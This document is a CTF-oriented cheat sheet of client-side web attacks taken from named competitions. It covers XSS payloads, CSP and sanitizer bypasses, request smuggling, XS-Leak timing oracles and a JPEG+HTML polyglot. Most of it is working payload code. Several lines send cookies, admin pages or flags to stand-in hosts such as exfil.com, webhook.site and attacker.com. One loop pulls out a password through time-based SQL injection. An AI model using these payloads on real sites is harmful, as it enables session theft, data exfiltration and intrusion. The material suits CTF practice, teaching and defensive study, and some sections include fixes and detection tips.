# CTF Web - Client-Side Attacks

## Table of Contents
- [XSS Payloads](#xss-payloads)
  - [Basic](#basic)
  - [Cookie Exfiltration](#cookie-exfiltration)
  - [Filter Bypass](#filter-bypass)
  - [Hex/Unicode Bypass](#hexunicode-bypass)
- [DOMPurify Bypass via Trusted Backend Routes](#dompurify-bypass-via-trusted-backend-routes)
- [JavaScript String Replace Exploitation](#javascript-string-replace-exploitation)
- [Client-Side Path Traversal (CSPT)](#client-side-path-traversal-cspt)
- [Cache Poisoning](#cache-poisoning)
- [Hidden DOM Elements](#hidden-dom-elements)
- [React-Controlled Input Programmatic Filling](#react-controlled-input-programmatic-filling)
- [Magic Link + Redirect Chain XSS](#magic-link--redirect-chain-xss)
- [Content-Type via File Extension](#content-type-via-file-extension)
- [DOM XSS via jQuery Hashchange (Crypto-Cat)](#dom-xss-via-jquery-hashchange-crypto-cat)
- [Shadow DOM XSS](#shadow-dom-xss)
- [DOM Clobbering + MIME Mismatch](#dom-clobbering--mime-mismatch)
- [HTTP Request Smuggling via Cache Proxy](#http-request-smuggling-via-cache-proxy)
- [CSS/JS Paywall Bypass](#cssjs-paywall-bypass)
- [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
- [JSFuck Decoding](#jsfuck-decoding)
- [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
  - [Why it works](#why-it-works)
  - [Step 1 — Redirect bot via meta refresh (CSP bypass)](#step-1--redirect-bot-via-meta-refresh-csp-bypass)
  - [Step 2 — Timing oracle via image loads](#step-2--timing-oracle-via-image-loads)
  - [Step 3 — Character-by-character extraction](#step-3--character-by-character-extraction)
  - [Step 4 — Host exploit and tunnel](#step-4--host-exploit-and-tunnel)
- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
- [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
- [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
- [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)

---

## XSS Payloads

### Basic
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

### Cookie Exfiltration
```html
<script>fetch('https://exfil.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://exfil.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>           <!-- Case mixing -->
<script>alert`1`</script>           <!-- Template literal -->
<img src=x onerror=alert&#40;1&#41;>  <!-- HTML entities -->
<svg/onload=alert(1)>               <!-- No space -->
```

### Hex/Unicode Bypass
- Hex encoding: `\x3cscript\x3e`
- HTML entities: `&#60;script&#62;`

---

## DOMPurify Bypass via Trusted Backend Routes

Frontend sanitizes before autosave, but backend trusts autosave — no sanitization.
Exploit: POST directly to `/api/autosave` with XSS payload.

---

## JavaScript String Replace Exploitation

`.replace()` special patterns: `$\`` = content BEFORE match, `$'` = content AFTER match
Payload: `<img src="abc$\`<img src=x onerror=alert(1)>">`

---

## Client-Side Path Traversal (CSPT)

Frontend JS uses URL param in fetch without validation:
```javascript
const profileId = urlParams.get("id");
fetch("/log/" + profileId, { method: "POST", body: JSON.stringify({...}) });
```
Exploit: `/user/profile?id=../admin/addAdmin` → fetches `/admin/addAdmin` with CSRF body

Parameter pollution: `/user/profile?id=1&id=../admin/addAdmin` (backend uses first, frontend uses last)

---

## Cache Poisoning

CDN/cache keys only on URL:
```python
requests.get(f"{TARGET}/search?query=harmless", data=f"query=<script>evil()</script>")
# All visitors to /search?query=harmless get XSS
```

---

## Hidden DOM Elements

Proof/flag in `display: none`, `visibility: hidden`, `opacity: 0`, or off-screen elements:
```javascript
document.querySelectorAll('[style*="display: none"], [hidden]')
  .forEach(el => console.log(el.id, el.textContent));

// Find all hidden content
document.querySelectorAll('*').forEach(el => {
  const s = getComputedStyle(el);
  if (s.display === 'none' || s.visibility === 'hidden' || s.opacity === '0')
    if (el.textContent.trim()) console.log(el.tagName, el.id, el.textContent.trim());
});
```

---

## React-Controlled Input Programmatic Filling

React ignores direct `.value` assignment. Use native setter + events:
```javascript
const input = document.querySelector('input[placeholder="SDG{...}"]');
const nativeSetter = Object.getOwnPropertyDescriptor(
  window.HTMLInputElement.prototype, 'value'
).set;
nativeSetter.call(input, 'desired_value');
input.dispatchEvent(new Event('input', { bubbles: true }));
input.dispatchEvent(new Event('change', { bubbles: true }));
```

Works for React, Vue, Angular. Essential for automated form filling via DevTools.

---

## Magic Link + Redirect Chain XSS
```javascript
// /magic/:token?redirect=/edit/<xss_post_id>
// Sets auth cookies, then redirects to attacker-controlled XSS page
```

---

## Content-Type via File Extension
```javascript
// @fastify/static determines Content-Type from extension
noteId = '<img src=x onerror="alert(1)">.html'
// Response: Content-Type: text/html → XSS
```

---

## DOM XSS via jQuery Hashchange (Crypto-Cat)

**Pattern:** jQuery's `$()` selector sink combined with `location.hash` source and `hashchange` event handler. Modern jQuery patches block direct `$(location.hash)` HTML injection, but iframe-triggered hashchange bypasses it.

**Vulnerable pattern:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**Exploit via iframe:** Trigger hashchange without direct user interaction by loading the target in an iframe, then modifying the hash via `onload`:
```html
<iframe src="https://vulnerable.com/#"
  onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```

**Key insight:** The iframe's `onload` fires after the initial load, then changing `this.src` triggers a `hashchange` event in the target page. The hash content (`<img src=x onerror=print()>`) passes through jQuery's `$()` which interprets it as HTML, creating a DOM element with the XSS payload.

**Detection:** Look for `$(location.hash)`, `$(window.location.hash)`, or any jQuery selector that accepts user-controlled input from URL fragments.

---

## Shadow DOM XSS

**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.

**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.

---

## DOM Clobbering + MIME Mismatch

**MIME type confusion (Pragyan 2026):** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.

**Form-based DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

---

## HTTP Request Smuggling via Cache Proxy

**Cache proxy desync (Pragyan 2026):** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.

**Cookie theft pattern:**
1. Create cached resource (e.g., blog post)
2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
3. Cache proxy returns cached response, doesn't consume POST body
4. Admin bot's next request bytes fill the POST body → stored on server
5. Read stored request to extract admin's cookies

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

---

## CSS/JS Paywall Bypass

**Pattern (Great Paywall, MetaCTF 2026):** Article content is fully present in the HTML but hidden behind a CSS/JS overlay (`position: fixed; z-index: 99999; backdrop-filter: blur(...)` with a "Subscribe" CTA).

**Quick solve:** `curl` the page — no CSS/JS rendering means the full article (and flag) are in the raw HTML.

```bash
curl -s https://target/article | grep -i "flag\|CTF{"
```

**Alternative approaches:**
- View page source in browser (Ctrl+U)
- Browser DevTools → delete the overlay element
- Disable JavaScript in browser settings
- `document.querySelector('#paywall-overlay').remove()` in console
- Googlebot user-agent: `curl -H "User-Agent: Googlebot" https://target/article`

**Key insight:** Many paywalls are client-side DOM overlays — the content is always in the HTML. The leetspeak hint "paywalls are just DOM" confirms this. Always try `curl` or view-source first before more complex approaches.

**Detection:** Look for `<div>` elements with `position: fixed`, high `z-index`, and `backdrop-filter: blur()` in the page source — these are overlay-based paywalls.

---

## JPEG+HTML Polyglot XSS (EHAX 2026)

**Pattern (Metadata Meyham):** File upload accepts JPEG, serves uploaded files with permissive MIME type. Admin bot visits reported files.

**Attack:** Create a JPEG+HTML polyglot — valid JPEG header followed by HTML/JS payload:
```python
from PIL import Image
import io

# Create minimal valid JPEG
img = Image.new('RGB', (1,1), color='red')
buf = io.BytesIO()
img.save(buf, 'JPEG', quality=1)
jpeg_data = buf.getvalue()

# HTML payload appended after JPEG data
html_payload = '''<!DOCTYPE html>
<html><body><script>
(async function(){
  // Fetch admin page content
  var r = await fetch("/admin");
  var t = await r.text();
  // Exfiltrate via self-upload (stays on same origin)
  var j = new Uint8Array([255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,217]);
  var b = new Blob([j], {type:'image/jpeg'});
  var f = new FormData();
  f.append('file', b, 'FLAG_' + btoa(t).substring(0,100) + '.jpg');
  await fetch('/upload', {method:'POST', body:f});
  // Also try external webhook
  new Image().src = "https://webhook.site/YOUR_ID?d=" + encodeURIComponent(t.substring(0,500));
})();
</script></body></html>'''

polyglot = jpeg_data + b'\n' + html_payload.encode()
# Upload as .html with image/jpeg content type
```

**PoW bypass:** Many CTF report endpoints require SHA-256 proof-of-work:
```python
import hashlib
nonce = 0
while True:
    h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
    if h.startswith('0' * difficulty):
        break
    nonce += 1
```

**Exfiltration methods (ranked by reliability):**
1. **Self-upload:** Fetch `/admin`, upload result as filename → check `/files` for new uploads
2. **Webhook:** `fetch('https://webhook.site/ID?flag='+data)` — may be blocked by CSP
3. **DNS exfil:** `new Image().src = 'http://'+btoa(flag)+'.attacker.com'` — bypasses most CSP

**Key insight:** JPEG files are tolerant of trailing data. Browsers parse HTML from anywhere in the response when MIME allows it. The polyglot is simultaneously a valid JPEG and valid HTML.

---

## JSFuck Decoding

**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

---

## Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)

**Pattern (Mirror Temple):** Admin bot navigates to user-supplied URL, validates with `new URL()` which only checks syntax — not protocol scheme. `javascript:` URLs pass validation and execute arbitrary JS in the bot's authenticated context.

**Vulnerable validation:**
```javascript
try {
  new URL(targetUrl)   // Accepts javascript:, data:, file:, etc.
} catch {
  process.exit(1)
}
await page.goto(targetUrl, { waitUntil: "domcontentloaded" })
```

**Exploit:**
```bash
# 1. Create authenticated session (bot requires valid cookie)
curl -i -X POST 'https://target/postcard-from-nyc' \
  --data-urlencode 'name=test' \
  --data-urlencode 'flag=dice{test}' \
  --data-urlencode 'portrait='
# Extract save=... cookie from Set-Cookie header

# 2. Submit javascript: URL to report endpoint
curl -X POST 'https://target/report' \
  -H 'Cookie: save=YOUR_COOKIE' \
  --data-urlencode "url=javascript:fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/ID/?flag='+encodeURIComponent(f))"
```

**Why CSP/SRI don't help (B-Side variant):** The B-Side adds inlined CSS, SRI integrity hashes on scripts, and strict CSP. None of these matter because `javascript:` URLs execute in a **navigation context** — the bot navigates to the JS URL directly, not injecting into an existing page. The CSP of the target page is irrelevant since the JS runs before any page loads.

**Fix:**
```javascript
const u = new URL(targetUrl)
if (!['http:', 'https:'].includes(u.protocol)) {
  process.exit(1)
}
```

**Key insight:** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.

---

## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)

**Pattern:** Admin bot visits attacker page → JavaScript makes cross-origin requests to `localhost` GraphQL endpoint → measures time-based SQLi via image load timing → exfiltrates data character by character.

### Why it works

1. **GraphQL GET CSRF:** Many GraphQL implementations accept GET requests (not just POST+JSON). GET requests with images bypass CORS preflight — no `OPTIONS` check needed.
2. **Bot runs on localhost:** The admin bot's browser can reach `localhost:1337/graphql` which is restricted from external access.
3. **Image error timing:** `new Image().src = url` fires `onerror` after the server responds. If SQL `SLEEP(1)` executes, the response is slow → timing difference reveals whether a character matches.

### Step 1 — Redirect bot via meta refresh (CSP bypass)

When CSP blocks inline scripts, use HTML injection with `<meta>` redirect:
```bash
curl -b cookies.txt "http://TARGET/api/chat/send" \
  -X POST -H "Content-Type: application/json" \
  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
```

The bot navigates to the attacker page, where JavaScript executes freely (different origin, no CSP restriction).

### Step 2 — Timing oracle via image loads

```javascript
const imageLoadTime = (src) => {
    return new Promise((resolve) => {
        let start = performance.now();
        const img = new Image();
        img.onload = () => resolve(0);
        img.onerror = () => resolve(performance.now() - start);
        img.src = src;
    });
};

const xsLeaks = async (query) => {
    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
        encodeURIComponent(query);
    let delay = await imageLoadTime(imgURL);
    return delay >= 1000;  // SLEEP(1) threshold
};
```

### Step 3 — Character-by-character extraction

```javascript
let sqlTemp = `query {
    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
    {id, enc_id, message, created_at} }`;

let readQueryTemp = `(select sleep(1) from dual where
    BINARY(SUBSTRING((select password from db.users
    where username = 'target'),__POS__,1))`;

let flag = '';
for (let pos = 1; ; pos++) {
    for (let c of charset) {
        let readQuery = readQueryTemp.replace('__POS__', pos);
        let sql = sqlTemp.replace('__LEFT__', readQuery)
                         .replace('__RIGHT__', `'${c}'`);
        if (await xsLeaks(sql)) {
            flag += c;
            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
            break;
        }
    }
}
```

### Step 4 — Host exploit and tunnel

```bash
# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
cloudflared tunnel --url http://localhost:8888
python3 -m http.server 8888
```

**Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.

**Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.

---

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**Pattern (demolition):** Server-side sanitizer (Flask regex `<\s*/?\s*script`) only matches ASCII. A second processing layer (Go `strings.EqualFold`) applies Unicode case folding, which canonicalizes `ſ` (U+017F, Latin Long S) to `s`.

**Payload:**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**How it works:**
1. Flask regex checks for `<script` — `<ſcript` does not match (ſ ≠ s in ASCII regex)
2. Go's `strings.EqualFold` canonicalizes `ſ` → `s`, treating `<ſcript>` as `<script>`
3. Frontend inserts via `innerHTML` — browser parses the now-valid script tag

**Other Unicode folding pairs for bypass:**
- `ſ` (U+017F) → `s` / `S`
- `ı` (U+0131) → `i` / `I`
- `ﬁ` (U+FB01) → `fi`
- `K` (U+212A, Kelvin sign) → `k` / `K`

**Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.

---

## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)

**Pattern (larpin):** Exfiltrate inline script content (e.g., `window.__USER_CONFIG__`) via CSS injection without JavaScript execution. Uses custom font glyph widths and CSS container queries as an oracle.

**Technique:**
1. **Target selection** — CSS selector targets inline script: `script:not([src]):has(+script[src*='purify'])`
2. **Custom font** — Each character glyph has a unique advance width: `width = (char_index + 1) * 1536` font units
3. **Container query oracle** — Wrapping element uses `container-type: inline-size`. Container queries match specific width ranges to trigger background-image requests:
```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```
4. **Per-character probing** — Iterate positions, each probe narrows to one character based on measured width

**Key insight:** CSS container queries (no JavaScript needed) combined with custom font metrics create a pixel-perfect oracle for text content. Works even under strict CSP that blocks all scripts.

---

## Hyperscript CDN CSP Bypass (UNbreakable 2026)

**Pattern (minegamble):** CSP allows `cdnjs.cloudflare.com` scripts. Hyperscript (`_hyperscript`) processes `_=` attributes client-side after HTML sanitization, enabling post-sanitization code execution.

**Payload:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

**How it works:**
1. HTML passes sanitizer (no inline script, no event handlers)
2. Hyperscript library loads from CDN (allowed by CSP)
3. Hyperscript scans DOM for `_=` attributes and executes them as behavioral directives
4. `on load` triggers arbitrary actions including fetch, DOM manipulation, cookie access

**Key insight:** Hyperscript, Alpine.js (`x-data`, `x-init`), htmx (`hx-get`, `hx-trigger`), and similar declarative JS frameworks execute code from HTML attributes that sanitizers don't recognize. If any CDN-hosted behavioral framework is CSP-allowed, it bypasses both CSP and HTML sanitizers.

---

## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)

**Pattern (svfgp):** Server checks `secret.startsWith(candidate)` where verification involves expensive PBKDF2 (3M iterations). Mismatches return fast; matches run the full KDF, creating a measurable timing difference.

**Exfiltration via postMessage:**
1. Open target page in a popup
2. For each character position, probe all candidates (`a-z0-9_}`)
3. Measure round-trip time via `postMessage` / response timing
4. Highest-latency character = correct prefix match

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    // Navigate popup to verification endpoint with candidate prefix
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();  // postMessage or load event
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.

---

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

**Pattern:** Application builds request URLs client-side with an HMAC parameter. The secret key is hardcoded in obfuscated JavaScript.

**Attack steps:**
1. Deobfuscate client-side JS (jsbeautifier.org or browser DevTools pretty-print)
2. Locate the signing function and extract the hardcoded secret
3. Use the leaked function directly in browser console to forge valid signatures for arbitrary requests

```javascript
// Discovered in deobfuscated main.js:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
    return "/load?p=" + page + "&s=" + sig;
}

// Exploit: call the leaked global function in browser console
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
// Fetching index.php via the p parameter returns raw PHP source code
```

**Key insight:** Client-side HMAC/signature schemes leak the secret by definition — the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.

---

## Terminal Control Character Obfuscation (SECCON 2015)

Server responses may hide data using ASCII backspace (0x08) characters. The terminal renders `S\x08 ` as a space (overwrites 'S'), making the flag invisible in normal display. Extract by reading raw bytes:

```python
import socket
s = socket.socket()
s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
# Or: filter only printable chars that aren't followed by backspace
```

---

## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)

When Content-Security-Policy whitelists cloud platform domains (e.g., `*.us-central1.run.app`, `*.cloudfunctions.net`, `*.azurewebsites.net`):

1. Deploy a malicious script to the whitelisted cloud platform
2. Load it via `<script src="https://your-func-xxxxx.us-central1.run.app">` — passes CSP
3. Exfiltrate data from the vulnerable page

```python
# Google Cloud Function that serves exfiltration JS
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                       'Access-Control-Allow-Origin': '*'})
```

Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`.

**Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.

---

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**Pattern (web-tutorial-2):** CSP uses `script-src 'nonce-xxx'` to restrict script execution to nonced scripts. However, the CSP is missing the `base-uri` directive. If you can inject HTML before a nonced script that loads from a relative URL, inject a `<base>` tag to redirect the relative URL to your server.

**Vulnerable CSP:**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
Notice: no `base-uri` directive.

**Vulnerable page HTML:**
```html
<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
<base href="https://attacker.com/">
<!-- ... later in the page ... -->
<script nonce="abc123" src="test.js"></script>
```

**How it works:**
1. The `<base href="https://attacker.com/">` tag changes the base URL for all relative URLs on the page
2. When the browser encounters `<script nonce="abc123" src="test.js">`, it resolves `test.js` relative to the new base → `https://attacker.com/test.js`
3. The script has a valid nonce, so CSP allows it
4. The script loads from the attacker's server, executing arbitrary JavaScript

**Exploit setup:**
```python
# Host malicious test.js on attacker server
# test.js content:
"""
fetch('/api/flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
"""
```

**Injection payload:**
```html
<base href="https://attacker.com/">
```

**Key insight:** The `<base>` tag affects ALL relative URLs on the page, including nonced scripts. CSP `script-src 'nonce-xxx'` only validates that the nonce matches — it does NOT restrict where the script is loaded from (that would require `script-src` with domain restrictions). Without `base-uri 'self'` or `base-uri 'none'` in the CSP, any HTML injection point before a relative-URL nonced script enables full CSP bypass.

**Defense:** Always include `base-uri 'self'` or `base-uri 'none'` in CSP policies that use nonces. This prevents `<base>` tag injection from redirecting script sources.

**Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.

**References:** BSidesSF 2026 "web-tutorial-2"
